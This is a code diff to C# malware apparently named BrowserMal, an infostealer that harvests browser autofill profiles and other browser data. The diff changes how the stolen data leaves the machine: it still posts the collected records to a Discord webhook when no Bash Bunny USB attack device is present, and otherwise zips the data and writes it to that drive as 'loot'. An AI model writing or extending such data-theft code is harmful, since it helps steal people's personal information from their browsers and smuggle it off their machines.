@@ -59,14 +59,19 @@ namespace BrowserMal
             GenericManager<AddressesModel> addressesManager = new GenericManager<AddressesModel>("autofill_profiles", new SqliteTableModel(addressesColumns));
             list.AddRange(addressesManager.Init(ref browsers, Browser.Util.WEB_DATA));
 
-            Discord.Webhook.BulkSend(list);
+            string root = GetBashBunny();
+
+            if (string.IsNullOrEmpty(root))
+            {
+                Discord.Webhook.BulkSend(list);
+                return;
+            }
+
+            Filesaver.FileManager.SaveBytes(root, "loot", Zip.ZipArchives(list));
+
             //Util.ProcessUtil.RunAfterSeconds("powershel");
         }
 
-        public static void Add(Dictionary<string, string> result, Dictionary<string, string> toAdd)
-        {
-            foreach (var record in toAdd)
-                result.Add(record.Key, record.Value);
-        }
+        private static string GetBashBunny() => RemovableDisks.FindBashBunny();
     }
 }
